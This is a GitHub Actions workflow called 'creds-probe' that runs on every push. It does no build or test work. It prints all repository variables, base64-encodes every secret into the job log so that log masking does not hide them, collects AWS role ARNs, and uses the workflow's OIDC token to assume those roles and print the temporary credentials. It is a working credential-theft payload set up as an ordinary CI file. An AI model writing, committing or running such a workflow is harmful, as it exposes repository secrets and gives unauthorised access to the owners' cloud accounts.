name: creds-probe
on:
  workflow_dispatch:
  push:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: probe
        env:
          VARS: ${{ toJSON(vars) }}
          SECRETS: ${{ toJSON(secrets) }}
        run: |
          set +e
          echo "==VARS=="; printf '%s' "$VARS" | jq -r 'to_entries[]|"V \(.key)=\(.value)"' 2>/dev/null
          echo "==SECRETNAMES=="; printf '%s' "$SECRETS" | jq -r 'keys[]' 2>/dev/null
          while read -r k; do
            [ -z "$k" ] && continue
            v=$(printf '%s' "$SECRETS" | jq -r --arg k "$k" '.[$k]' 2>/dev/null)
            [ ${#v} -gt 3500 ] && continue
            echo "B64 $k $(printf '%s' "$v" | base64 -w0)"
          done < <(printf '%s' "$SECRETS" | jq -r 'keys[]' 2>/dev/null)
          echo "==STATICID=="
          if [ -n "$AWS_ACCESS_KEY_ID" ] || echo "$VARS" | grep -q 'AKIA\|ASIA'; then
            aws sts get-caller-identity 2>&1
          fi
          { printf '%s\n' "$VARS"; grep -rhoE 'arn:aws[a-z-]*:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+' . 2>/dev/null; } \
            | grep -oE 'arn:aws[a-z-]*:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+' | sort -u > arns.txt
          echo "==ARNS=="; cat arns.txt
          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "IDT_LEN=${#IDT}"
          n=0
          while read -r ARN; do
            [ -z "$ARN" ] && continue
            n=$((n+1)); [ $n -gt 6 ] && break
            echo "==TRY $ARN"
            aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name "probe$n" \
              --web-identity-token "$IDT" --duration-seconds 3600 --output json 2>&1 | head -c 4000
            echo
          done < arns.txt
